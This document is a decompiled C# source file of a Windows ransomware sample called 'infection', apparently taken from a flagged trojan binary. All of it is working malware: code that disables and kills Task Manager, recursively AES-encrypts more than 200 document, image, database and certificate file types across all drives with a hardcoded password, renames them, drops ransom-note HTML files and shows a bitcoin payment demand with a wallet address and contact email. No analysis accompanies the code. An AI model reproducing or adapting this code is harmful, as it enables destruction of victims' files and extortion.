// Decompiled with JetBrains decompiler
// Type: infection.MainForm
// Assembly: infection, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7721E3E7-3AA7-4598-8573-72D5D350F389
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.MSIL.Agent.gen-d945be73739dd215d82c42a8e74db1166313e37d222f75c8fa4058a6f6acac7c.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace infection
{
  public class MainForm : Form
  {
    private string userName = Environment.UserName;
    private string computerName = Environment.MachineName.ToString();
    private string userDir = "C:\\Users\\";
    private IContainer components;
    private Label label1;
    private Label label2;
    private LinkLabel linkLabel1;
    private Label label3;
    private Label label5;
    private LinkLabel linkLabel2;
    private Button button1;
    private Label label4;
    private Label label6;
    private Label label7;
    private Label label8;
    private Label label9;

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(
      uint action,
      uint param,
      string vParam,
      uint winIni);

    public MainForm()
    {
      Directory.CreateDirectory("C:\\Program Files\\Temp");
      MainForm.Extract("infection", "C:\\Program Files\\Temp", "Resources", "static.png");
      this.InitializeComponent();
    }

    public static void Extract(
      string nameSpace,
      string outDirectory,
      string internalFilePath,
      string resourceName)
    {
      using (Stream manifestResourceStream = Assembly.GetCallingAssembly().GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
      {
        using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
        {
          using (FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
          {
            using (BinaryWriter binaryWriter = new BinaryWriter((Stream) output))
              binaryWriter.Write(binaryReader.ReadBytes((int) manifestResourceStream.Length));
          }
        }
      }
    }

    private void ChangeWallpaper(string path) => MainForm.SystemParametersInfo(20U, 0U, path, 3U);

    private void Form1_Load(object sender, EventArgs e)
    {
      this.ControlBox = false;
      this.ShowInTaskbar = false;
      this.startAction();
    }

    private void Form_Shown(object sender, EventArgs e)
    {
    }

    public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 1,
        (byte) 2,
        (byte) 2,
        (byte) 3,
        (byte) 3,
        (byte) 4,
        (byte) 4
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
          }
          return memoryStream.ToArray();
        }
      }
    }

    public string CreateRandomString(int length, string str)
    {
      string str1 = str;
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      while (0 < length--)
        stringBuilder.Append(str1[random.Next(str1.Length)]);
      return stringBuilder.ToString();
    }

    public void EncryptFile(string file, string password)
    {
      byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
      byte[] bytes1 = Encoding.UTF8.GetBytes(password);
      byte[] hash = SHA256.Create().ComputeHash(bytes1);
      byte[] bytes2 = this.AES_Encrypt(bytesToBeEncrypted, hash);
      try
      {
        File.WriteAllBytes(file, bytes2);
        string str = "infection";
        File.Move(file, file + "." + str);
      }
      catch (UnauthorizedAccessException ex)
      {
      }
    }

    public void encryptDirectory(string location, string password)
    {
      try
      {
        string[] source = new string[204]
        {
          ".txt",
          ".doc",
          ".docx",
          ".xls",
          ".xlsx",
          ".ppt",
          ".pptx",
          ".odt",
          "jpeg",
          ".png",
          ".csv",
          ".sql",
          ".mdb",
          ".sln",
          ".php",
          ".asp",
          ".aspx",
          ".html",
          ".xml",
          ".psd",
          ".sql",
          ".mp4",
          ".7z",
          ".rar",
          ".m4a",
          ".wma",
          ".avi",
          ".wmv",
          ".csv",
          ".d3dbsp",
          ".zip",
          ".sie",
          ".sum",
          ".ibank",
          ".t13",
          ".t12",
          ".qdf",
          ".gdb",
          ".tax",
          ".pkpass",
          ".bc6",
          ".bc7",
          ".bkp",
          ".qic",
          ".bkf",
          ".sidn",
          ".sidd",
          ".mddata",
          ".itl",
          ".itdb",
          ".icxs",
          ".hvpl",
          ".hplg",
          ".hkdb",
          ".mdbackup",
          ".syncdb",
          ".gho",
          ".cas",
          ".svg",
          ".map",
          ".wmo",
          ".itm",
          ".sb",
          ".fos",
          ".mov",
          ".vdf",
          ".ztmp",
          ".sis",
          ".sid",
          ".ncf",
          ".menu",
          ".layout",
          ".dmp",
          ".blob",
          ".esm",
          ".vcf",
          ".vtf",
          ".dazip",
          ".fpk",
          ".mlx",
          ".kf",
          ".iwd",
          ".vpk",
          ".tor",
          ".psk",
          ".rim",
          ".w3x",
          ".fsh",
          ".ntl",
          ".arch00",
          ".lvl",
          ".snx",
          ".cfr",
          ".ff",
          ".vpp_pc",
          ".lrf",
          ".m2",
          ".mcmeta",
          ".vfs0",
          ".mpqge",
          ".kdb",
          ".db0",
          ".dba",
          ".rofl",
          ".hkx",
          ".bar",
          ".upk",
          ".das",
          ".iwi",
          ".litemod",
          ".asset",
          ".forge",
          ".ltx",
          ".bsa",
          ".apk",
          ".re4",
          ".sav",
          ".lbf",
          ".slm",
          ".bik",
          ".epk",
          ".rgss3a",
          ".pak",
          ".big",
          "wallet",
          ".wotreplay",
          ".xxx",
          ".desc",
          ".py",
          ".m3u",
          ".flv",
          ".js",
          ".css",
          ".rb",
          ".p7c",
          ".pk7",
          ".p7b",
          ".p12",
          ".pfx",
          ".pem",
          ".crt",
          ".cer",
          ".der",
          ".x3f",
          ".srw",
          ".pef",
          ".ptx",
          ".r3d",
          ".rw2",
          ".rwl",
          ".raw",
          ".raf",
          ".orf",
          ".nrw",
          ".mrwref",
          ".mef",
          ".erf",
          ".kdc",
          ".dcr",
          ".cr2",
          ".crw",
          ".bay",
          ".sr2",
          ".srf",
          ".arw",
          ".3fr",
          ".dng",
          ".jpe",
          ".jpg",
          ".cdr",
          ".indd",
          ".ai",
          ".eps",
          ".pdf",
          ".pdd",
          ".dbf",
          ".mdf",
          ".wb2",
          ".rtf",
          ".wpd",
          ".dxg",
          ".xf",
          ".dwg",
          ".pst",
          ".accdb",
          ".mdb",
          ".pptm",
          ".pptx",
          ".ppt",
          ".xlk",
          ".xlsb",
          ".xlsm",
          ".xlsx",
          ".xls",
          ".wps",
          ".docm",
          ".docx",
          ".doc",
          ".odb",
          ".odc",
          ".odm",
          ".odp",
          ".ods",
          ".odt"
        };
        string[] files = Directory.GetFiles(location);
        string[] directories = Directory.GetDirectories(location);
        for (int index = 0; index < files.Length; ++index)
        {
          string extension = Path.GetExtension(files[index]);
          if (((IEnumerable<string>) source).Contains<string>(extension))
            this.EncryptFile(files[index], password);
        }
        for (int index = 0; index < directories.Length; ++index)
        {
          if (!directories[index].Contains("Windows") && !directories[index].Contains("Program Files") && !directories[index].Contains("Program Files (x86)"))
          {
            this.encryptDirectory(directories[index], password);
            this.messageCreator(directories[index]);
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    public void startAction()
    {
      Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", (object) 1, RegistryValueKind.DWord);
      if (Process.GetProcessesByName("taskmgr").Length == 1)
        Process.Start(new ProcessStartInfo()
        {
          FileName = "cmd.exe",
          WindowStyle = ProcessWindowStyle.Hidden,
          Arguments = "/k taskkill /f /im taskmgr.exe && exit"
        });
      string password = "Infection_BABY";
      string str = this.userDir + this.userName + "\\Desktop\\test";
      this.ChangeWallpaper("C:\\Program Files\\Temp\\static.png");
      foreach (string logicalDrive in Directory.GetLogicalDrives())
      {
        if (logicalDrive == "C:\\")
        {
          this.encryptDirectory(str, password);
          this.messageCreator(str);
        }
        else
          this.encryptDirectory(logicalDrive, password);
        this.messageCreator(logicalDrive);
      }
    }

    public void messageCreator(string path)
    {
      string[] contents = new string[2]
      {
        "<html><body>Files has been encrypted with one of Infection Tools",
        "Send me some bitcoins or say goodbye to your files...</body></html>"
      };
      try
      {
        File.WriteAllLines(path + "\\CITESTE.html", contents);
      }
      catch (Exception ex)
      {
      }
    }

    private void label1_Click(object sender, EventArgs e)
    {
    }

    private void button1_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Nu merge asa sefule", "Infection Netowrk", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void label2_Click(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (MainForm));
      this.label1 = new Label();
      this.label2 = new Label();
      this.linkLabel1 = new LinkLabel();
      this.label3 = new Label();
      this.label5 = new Label();
      this.linkLabel2 = new LinkLabel();
      this.button1 = new Button();
      this.label4 = new Label();
      this.label6 = new Label();
      this.label7 = new Label();
      this.label8 = new Label();
      this.label9 = new Label();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Arial Narrow", 12f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.label1.Location = new Point(295, 250);
      this.label1.Name = "label1";
      this.label1.Size = new Size(97, 20);
      this.label1.TabIndex = 0;
      this.label1.Text = "Infection#6389";
      this.label1.Click += new EventHandler(this.label1_Click);
      this.label2.AutoSize = true;
      this.label2.Font = new Font("Arial Narrow", 15.75f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.label2.Location = new Point(147, 38);
      this.label2.Name = "label2";
      this.label2.Size = new Size(245, 25);
      this.label2.TabIndex = 1;
      this.label2.Text = "Foloseste si tu anti-virus =)";
      this.label2.Click += new EventHandler(this.label2_Click);
      this.linkLabel1.AutoSize = true;
      this.linkLabel1.Font = new Font("Arial Narrow", 9.75f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.linkLabel1.Location = new Point(70, 224);
      this.linkLabel1.Name = "linkLabel1";
      this.linkLabel1.Size = new Size(172, 16);
      this.linkLabel1.TabIndex = 2;
      this.linkLabel1.TabStop = true;
      this.linkLabel1.Text = "https://discord.gg/4QhaCjH6hG";
      this.label3.AutoSize = true;
      this.label3.Font = new Font("Arial Narrow", 11.25f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.label3.Location = new Point(12, 221);
      this.label3.Name = "label3";
      this.label3.Size = new Size(52, 20);
      this.label3.TabIndex = 3;
      this.label3.Text = "SV DIS:";
      this.label5.AutoSize = true;
      this.label5.Font = new Font("Arial Narrow", 11.25f, FontStyle.Bold | FontStyle.Italic);
      this.label5.Location = new Point(13, 252);
      this.label5.Name = "label5";
      this.label5.Size = new Size(61, 20);
      this.label5.TabIndex = 5;
      this.label5.Text = "GITHUB:";
      this.linkLabel2.AutoSize = true;
      this.linkLabel2.Font = new Font("Arial Narrow", 9.75f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.linkLabel2.Location = new Point(76, 252);
      this.linkLabel2.Name = "linkLabel2";
      this.linkLabel2.Size = new Size(164, 16);
      this.linkLabel2.TabIndex = 6;
      this.linkLabel2.TabStop = true;
      this.linkLabel2.Text = "https://github.com/1Dragos12";
      this.button1.Location = new Point(308, 224);
      this.button1.Name = "button1";
      this.button1.Size = new Size(75, 23);
      this.button1.TabIndex = 7;
      this.button1.Text = "QUIT";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.label4.AutoSize = true;
      this.label4.Font = new Font("Arial Narrow", 18f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.label4.Location = new Point(68, 9);
      this.label4.Name = "label4";
      this.label4.Size = new Size(247, 29);
      this.label4.TabIndex = 8;
      this.label4.Text = "Ahh! Iar te-am virusat =))";
      this.label6.AutoSize = true;
      this.label6.Font = new Font("Arial Narrow", 15.75f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.label6.Location = new Point(57, 63);
      this.label6.Name = "label6";
      this.label6.Size = new Size(240, 25);
      this.label6.TabIndex = 9;
      this.label6.Text = "Security Is Just An Illusion";
      this.label7.AutoSize = true;
      this.label7.Font = new Font("Arial Narrow", 12f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.label7.Location = new Point(12, 109);
      this.label7.Name = "label7";
      this.label7.Size = new Size(371, 20);
      this.label7.TabIndex = 10;
      this.label7.Text = "Send 10000 btc to 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH";
      this.label8.AutoSize = true;
      this.label8.Font = new Font("Arial Narrow", 14.25f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.label8.Location = new Point(13, 141);
      this.label8.Name = "label8";
      this.label8.Size = new Size(389, 23);
      this.label8.TabIndex = 11;
      this.label8.Text = "After that send a screenshot of the transaction to: ";
      this.label9.AutoSize = true;
      this.label9.Font = new Font("Arial Narrow", 14.25f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.label9.Location = new Point(13, 164);
      this.label9.Name = "label9";
      this.label9.Size = new Size(225, 23);
      this.label9.TabIndex = 12;
      this.label9.Text = "tutorialegratuite@gmail.com";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(404, 283);
      this.Controls.Add((Control) this.label9);
      this.Controls.Add((Control) this.label8);
      this.Controls.Add((Control) this.label7);
      this.Controls.Add((Control) this.label6);
      this.Controls.Add((Control) this.label4);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.linkLabel2);
      this.Controls.Add((Control) this.label5);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.linkLabel1);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.label1);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (MainForm);
      this.ShowInTaskbar = false;
      this.Text = "Infection Network ";
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
